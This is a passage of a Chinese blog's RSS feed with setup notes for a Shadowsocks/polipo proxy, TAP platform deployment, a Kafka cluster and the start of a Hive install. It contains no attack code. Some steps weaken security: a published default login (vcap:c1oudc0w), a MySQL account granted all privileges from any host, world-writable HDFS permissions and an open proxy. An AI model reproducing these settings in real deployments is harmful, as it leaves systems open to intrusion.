    &lt;p&gt;新建配置文件/etc/shadowsocks.json，配置参数可以从&lt;a href=&quot;https://portal.shadowsocks.com.hk/&quot;&gt;https://portal.shadowsocks.com.hk/&lt;/a&gt;网站购买：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;		
   &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;server&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{your-server}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;server_port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;your-port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;local_port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1080&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{your-password}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;method&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;aes-256-cfb&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;配置全局代理。安装polipo：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo apt-get install polipo
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改配置文件/etc/polipo/config：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; logSyslog = true
 logFile = /var/log/polipo/polipo.log
 proxyAddress = &quot;0.0.0.0&quot;
 socksParentProxy = &quot;127.0.0.1:1080&quot;
 socksProxyType = socks5
 allowedPorts = 1-65535
 tunnelAllowedPorts = 1-65535
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;编写开机启动脚本：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; sudo sslocal -c /etc/shadowsocks.json -d restart
 sudo /etc/init.d/polipo restart
 export http_proxy=http://127.0.0.1:8123/
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;测试：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo http_proxy=http://127.0.0.1:8123 curl www.t66y.com # 小孩子不要打开这个网址
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;tap-1&quot;&gt;TAP平台搭建&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;按照&lt;a href=&quot;https://github.com/trustedanalytics/platform-wiki-0.7/wiki/0.7-Openstack-Platform-Deployment&quot;&gt;https://github.com/trustedanalytics/platform-wiki-0.7/wiki/0.7-Openstack-Platform-Deployment&lt;/a&gt;步骤搭建，我选择的配置文件是TAP-FullVM.yaml&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;section-1&quot;&gt;查看安装日志&lt;/h3&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;使用Key Pair登录JumpBox，在本机：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ssh ubuntu@&amp;lt;jumpbox_server_ip&amp;gt; -i &amp;lt;你配置文件中选择的key pair&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;从JumpBox登录Nignx，在JumpBox中：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ sudo -i
  # ssh ubuntu@&amp;lt;nignx_server_ip&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查看安装日志/var/log/cloud-init-output.log、/var/log/ansible.log&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;section-2&quot;&gt;登录其他主机&lt;/h3&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;nignx主机从root@jump-box中用密钥登录，用户名为ubuntu&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;cdh-master和cdh-worker主机从root@jump-box中用密钥登录，用户名为ec2-user&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;docker-broker主机在OpenStack中名为broker/0，登录用户名和密码为vcap:c1oudc0w&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;section-3&quot;&gt;失败后重新搭建&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;在FUEL UI重置OpenStack环境并重新部署&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;按正常流程运行，其中在运行/opt/tap.sh阶段，可能出现的失败情况：&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;创建docker-broker时，not running after update错误。在jump-box执行：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ bosh locks			# 查看未释放锁的进程
 $ bosh delete deployment docker-broker
 $ bosh deployment docker-broker.yml
 $ bosh -n deploy 
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;执行以下命令时，由于找不到${port_id}，导致错误Unable to find port with name or id ‘type=dict’：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; neutron --insecure --os-cloud TAP port-update ${port_id} --allowed-address-pairs type=dict list=true ip_address=10.0.4.0/24 ip_address=172.17.0.0/16
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;

        &lt;p&gt;手动将文件.ansible/pull/jump-box.novalocal/roles/tap/tasks/main.yml中的${port_id}修改为DockerSubnet中IP为10.0.4.4的portId&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;连接http://archive.apache.org时出现Connection reset by peer错误：&lt;/p&gt;

        &lt;p&gt;修改文件h2o-provisioner/src/main/docker/Dockerfile，&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; - wget http://archive.apache.org/dist/hadoop/core/hadoop-2.6.0/hadoop-2.6.0.tar.gz
 + wget http://apache.mirrors.lucidnetworks.net/hadoop/core/hadoop-2.6.0/hadoop-2.6.0.tar.gz
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在运行~/tqd.sh阶段，可能出现的失败情况：&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;遇到parcel.state错误时（一般是在下载parcel时强制ctrl+c，导致parcel.stage一直处于DOWNLOADING状态中），在jump-box主机中修改文件./platform-ansible/library/cdh.py：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; elif action_a == &#39;deploy_parcel&#39;:
     ...
     if parcel.stage == &#39;DOWNLOADING&#39;:
         cluster.stop().wait()
         cluster.start().wait()
     ...
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;在分发parcels是遇到No such torrent错误：&lt;/p&gt;

        &lt;p&gt;从cdh-master-2.node.envname.consul主机中删除文件/opt/cloudera/parcel-cache/&lt;parcel_name&gt;.torrent&lt;/parcel_name&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;tap-2&quot;&gt;TAP平台使用&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;未完待续&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 09 Mar 2017 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io/2017/TAP%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io/2017/TAP%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(8)-消息队列</title>
        <description>&lt;p&gt;&lt;em&gt;以Kafka为例学习消息队列的相关知识，并在集群上搭建Kafka。包括介绍消息队列、Kafka整体架构等&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;消息队列&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;消息队列是在消息传输过程中保存消息的容器或中间件，其主要目的是提供消息路由并保障消息的可靠传递。&lt;/p&gt;

&lt;p&gt;常见的消息中间件包括ActiveMQ、ZeroMQ、RabbitMQ和Kafka等。一般消息中间件支持两种模式的队列：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;消息队列模式&lt;/p&gt;

    &lt;p&gt;即&lt;strong&gt;消息生产者将消息存入队列，消息消费者从队列消费消息&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Pub-Sub模式&lt;/p&gt;

    &lt;p&gt;消息生产者将消息&lt;strong&gt;发布到指定主题的队列中&lt;/strong&gt;，而消费者&lt;strong&gt;订阅指定主题的队列消息&lt;/strong&gt;，当订阅的主题有新消息时，消费者可以通过拉取(Pull)或中间件的推送(Push)消费消息&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;kafka&quot;&gt;Kafka&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Kafka是LinkedIn开源的采用Pub-Sub模式的分布式消息系统，最初被设计作为Log收集工具，因其具有极高吞吐量、低延迟、可扩展、高可用以及能够对消息队列进行持久化保存（不是将全部消息保存在内存中传递），因此应用场景较多，比如作为通用的消息系统、消息实时收集、以及流式计算系统的底层构建等。&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;section-1&quot;&gt;整体架构&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;Kafka架构主要由消息生产者（Producer）、代理服务器（Broker）、消息消费者（Consumer）构成&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Producer：生产者生产指定主题（Topic）的消息并传入代理服务器集群&lt;/li&gt;
  &lt;li&gt;Broker：代理服务器集群在磁盘存储维护各种Topic的消息队列&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Consumer：消费者根据自己订阅的Topic从代理服务器集群中&lt;strong&gt;拉取（Pull）&lt;/strong&gt;新消息并对其进行处理，每个consumer属于一个consumer group，每个group中可以有多个consumer。发送到Topic的消息，只会被订阅此Topic的每个group中的一个consumer消费&lt;/p&gt;

    &lt;p&gt;采用pull方式的好处是消费者可以自主控制消费速率，避免消费者因处理速度跟不上生产者而导致消息大量积压&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Topic：即在内部对应某个名字的消息队列，比如用户访问网站的行为可以分为登录、搜索等不同Topic。Kafka支持对Topic进行数据分片（Partition）&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Partition：每个数据分片是有序的、不可更改的尾部追加的消息队列。队列内的每个消息被分配给该数据分片内唯一的Offset。用户可以根据需求，如用户UID进行哈希分配，使得同一用户的数据会放入相同Partion中&lt;/p&gt;

    &lt;p&gt;对于某个Partition，在系统中是一系列被切割成固定大小的文件，新消息被追加到最后一个文件的尾部，同时在内存中维护每个文件首个消息的Offset组成的有序数组作为索引，其内容指向外部文件。消费者读取某个消息时，需要指定消息对应的Offset及读取的内容大小&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;因为Kafka的消息是存储在文件中的，因此天然具有持久化的能力&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;性能优化：Kafka是一个基于文件系统的消息系统，能够高效处理大批量消息的一个重要原因就是尽可能避免随机读写，尽可能转换为顺序读写，即连续读写整块数据，如Log文件尾部追加写&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;消费者可以通过变换Offset来从对应数据分片读取过期的消息，因此满足“至少送达一次”的语义&lt;/p&gt;

&lt;p&gt;Kafka将消费者目前读取到队列中的哪个信息这个信息交由消费者各自保管，并将很多其他管理信息都存放在Zookeeper而非代理服务器中，这样代理服务器完全成为无状态的，无需记载任何状态信息，增强了消息系统的容错和扩展性&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;kafka01020&quot;&gt;安装Kafka（版本0.10.2.0）&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;section-2&quot;&gt;准备工作&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;按照&lt;a href=&quot;https://wuyinan0126.github.io/2017/大数据学习笔记(5)-分布式协调系统/&quot;&gt;大数据学习笔记(5)-分布式协调系统&lt;/a&gt;安装好Zookeeper&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;下载Kafka二进制包，解压至/opt/:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible zookeeper -m copy -a &#39;src=/home/cat/cat/kafka_2.11-0.10.2.0.tgz dest=/home/cat/cat/&#39;
 $ ansible zookeeper -a &#39;tar -zxvf /home/cat/cat/kafka_2.11-0.10.2.0.tgz -C /opt/&#39;
 $ ansible zookeeper -a &#39;mv /opt/kafka_2.11-0.10.2.0 /opt/kafka-0.10.2.0&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;创建kafka日志目录:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible zookeeper -a &#39;mkdir /opt/kafka-0.10.2.0/logs&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;kafka-1&quot;&gt;配置Kafka&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;conf/server.properties&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ##### 需要配置 #####
 # 节点唯一标识，类似zookeeper的myid
 broker.id=0  
 host.name=10.2.2.141
 # 消息存放的目录，这个目录可以配置为逗号分割的表达式，num.io.threads要大于这个目录的个数
 log.dirs=/opt/kafka-0.10.2.0/logs/
 # 设置zookeeper的连接端口
 zookeeper.connect=10.2.2.141:2181,10.2.2.142:2181,10.2.2.143:2181 

 ##### 使用默认 #####
 # kafka对外提供服务的端口
 port=9092 
 # borker进行网络处理的线程数
 num.network.threads=3 
 # borker进行I/O处理的线程数
 num.io.threads=8 
 # 发送缓冲区buffer大小
 socket.send.buffer.bytes=102400 
 # kafka接收缓冲区大小，当数据到达一定大小后再序列化到磁盘
 socket.receive.buffer.bytes=102400 
 # 这个参数是向kafka请求消息或者向kafka发送消息的请求最大数，这个值不能超过java的堆栈大小
 socket.request.max.bytes=104857600 
 # 默认的分区数，一个topic默认1个分区数
 num.partitions=1 
 # 默认消息的最大持久化时间，168小时，7天
 log.retention.hours=168 
 # 消息保存的最大值5M
 message.max.byte=5242880  
 # kafka保存消息的副本数，如果一个副本失效了，另一个还可以继续提供服务
 default.replication.factor=2  
 # 取消息的最大直接数
 replica.fetch.max.bytes=5242880 
 # 因为kafka的消息是以追加的形式落地到文件，当超过这个值的时候，kafka会新起一个文件
 log.segment.bytes=1073741824 
 # 每隔300秒去检查上面配置的log失效时间（log.retention.hours=168），到目录查看是否有过期的消息如果有，删除
 log.retention.check.interval.ms=300000 
 # 是否启用log压缩，一般不用启用，启用的话可以提高性能
 log.cleaner.enable=false 
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;分发配置文件&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible zookeeper -m copy -a &#39;src=/opt/kafka-0.10.2.0/config/ dest=/opt/kafka-0.10.2.0/config/&#39;	
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;登入每台kafka节点，修改broker.id和host.name&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;kafka-2&quot;&gt;启动Kafka&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;在每个kafka节点：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ kafka-server-start.sh -daemon /opt/kafka-0.10.2.0/config/server.properties
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;kafka-3&quot;&gt;测试Kafka&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;在主节点查看&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ zkCli.sh
 [zk: localhost:2181(CONNECTED) 0] ls /
 [cluster, controller_epoch, controller, brokers, zookeeper, hadoop-ha, admin, isr_change_notification, consumers, config]
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[可选]创建topic，一个副本，一个分区&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[可选]查看topic&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ kafka-topics.sh --list --zookeeper localhost:2181
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[可选]使用kafka-console-producer在控制台发送消息&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ kafka-console-producer.sh --broker-list localhost:9092 --topic test
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[可选]使用kafka-console-consumer在控制台接受消息&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ kafka-console-consumer.sh --zookeeper localhost:2181 --topic test --from-beginning
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[可选]如果在producer console输入一条消息，能从consumer console看到这条消息就代表安装是成功&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;
</description>
        <pubDate>Thu, 02 Feb 2017 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io/2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(8)-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io/2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(8)-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(7)-数据仓库</title>
        <description>&lt;p&gt;**&lt;/p&gt;

&lt;h2 id=&quot;hive210on-tez085&quot;&gt;安装Hive（版本2.1.0）on Tez（版本0.8.5）&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;section&quot;&gt;准备工作&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;按照&lt;a href=&quot;https://wuyinan0126.github.io/2016/大数据学习笔记(2)-Hadoop/&quot;&gt;大数据学习笔记(2)-Hadoop&lt;/a&gt;做好部署前提准备&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;下载Hive二进制包，解压至/opt/:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible all -m copy -a &#39;src=/home/cat/cat/apache-hive-2.1.0-bin.tar.gz dest=/home/cat/cat/&#39;
 $ ansible all -a &#39;tar -zxvf /home/cat/cat/apache-hive-2.1.0-bin.tar.gz -C /opt/&#39;
 $ ansible all -a &#39;mv /opt/apache-hive-2.1.0-bin /opt/hive-2.1.0&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;下载Mysql驱动包&lt;a href=&quot;https://dev.mysql.com/downloads/connector/j/&quot;&gt;https://dev.mysql.com/downloads/connector/j/&lt;/a&gt;，并放入/opt/hive-2.1.0/lib中&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible slave -m copy -a &#39;src=/opt/hive-2.1.0/lib/ dest=/opt/hive-2.1.0/lib/&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;(在主节点)安装MySQL用于存储元数据&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo apt-get install mysql-server
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;为Hive建立相应的MySQL账户,并赋予足够的权限:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ mysql -uroot -p
 mysql&amp;gt; CREATE USER &#39;hive&#39; IDENTIFIED BY &#39;yourpassword&#39;;
 mysql&amp;gt; GRANT ALL PRIVILEGES ON *.* TO &#39;hive&#39;@&#39;%&#39; WITH GRANT OPTION;
 mysql&amp;gt; flush privileges;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[可选] 解除Mysql只允许本地登录，/etc/mysql/mysql.conf.d/mysqld.cnf :&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; #bind-address           = 127.0.0.1
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;重新加载配置文件&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo service mysql restart
 #在MacOS中
 $ launchctl unload /Users/wuyinan/Library/LaunchAgents/homebrew.mxcl.mysql.plist
 $ launchctl load /Users/wuyinan/Library/LaunchAgents/homebrew.mxcl.mysql.plist
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;建立Hive专用的元数据库:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ mysql -uhive -p
 mysql&amp;gt; create database metastore;
 mysql&amp;gt; USE metastore;
 mysql&amp;gt; SOURCE /opt/hive-2.1.0/scripts/metastore/upgrade/mysql/hive-schema-2.1.0.mysql.sql;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在HDFS创建数据存储仓库&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ hadoop fs -mkdir -p /user/hive/warehouse
 $ hadoop fs -chmod -R 777 /user/hive
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;创建hive的log文件存储目录&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ mkdir /opt/hive-2.1.0/logs
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;hive&quot;&gt;配置Hive&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;增加conf/hive-site.xml文件::&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&amp;gt;
 &amp;lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&amp;gt;
 &amp;lt;configuration&amp;gt;
   &amp;lt;property&amp;gt;
     &amp;lt;name&amp;gt;javax.jdo.option.ConnectionURL&amp;lt;/name&amp;gt;
     &amp;lt;value&amp;gt;jdbc:mysql://10.2.2.141:3306/metastore?characterEncoding=UTF-8&amp;amp;amp;useSSL=false&amp;lt;/value&amp;gt;
     &amp;lt;description&amp;gt;元数据存储的Mysql路径&amp;lt;/description&amp;gt;
   &amp;lt;/property&amp;gt;
   &amp;lt;property&amp;gt;
     &amp;lt;name&amp;gt;javax.jdo.option.ConnectionDriverName&amp;lt;/name&amp;gt;
     &amp;lt;value&amp;gt;com.mysql.jdbc.Driver&amp;lt;/value&amp;gt;
   &amp;lt;/property&amp;gt;
   &amp;lt;property&amp;gt;
     &amp;lt;name&amp;gt;javax.jdo.option.ConnectionUserName&amp;lt;/name&amp;gt;
     &amp;lt;value&amp;gt;hive&amp;lt;/value&amp;gt;
   &amp;lt;/property&amp;gt;
